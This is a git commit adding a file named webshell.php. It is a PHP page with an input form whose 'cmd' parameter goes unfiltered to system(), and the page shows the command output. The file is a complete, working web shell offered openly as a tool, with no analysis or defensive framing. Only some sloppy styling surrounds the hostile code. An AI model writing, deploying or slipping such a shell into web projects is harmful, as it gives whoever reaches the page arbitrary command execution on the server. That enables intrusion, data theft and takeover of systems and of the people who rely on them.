39d7c11e4fc4bc7fce22de6a33bbb8e1d6f396cf
Mobaka9 <115622065+Mobaka9@users.noreply.github.com>
2022-11-18 16:53:43 +0100

    Add files via upload

---
+++ webshell.php
@@ -0,0 +1,51 @@
+<html>
+<?php
+include 'header.php';
+?>   
+<body>
+<div class="barre">
+    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+
+    <ul class="box">
+
+        <input class="form-control mr-sm-2" type="TEXT" name="cmd" autofocus id="cmd" size="80">
+        <input class="btn btn-outline-success my-2 my-sm-0" type="SUBMIT" value="Execute">
+    </ul>
+    </form>
+</div>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<?php
+include 'footer.html';
+?>
+<style>
+.box {
+    display: flex;
+    flex-direction: row;
+}
+.input
+{
+    
+  height: 50px;
+  width: 30px;
+  font-size: 3.5em;
+}
+.barre {
+ 
+    position : absolute
+
+    left 50px;
+    top 75px;
+
+
+}
+
+</style>
+</html>
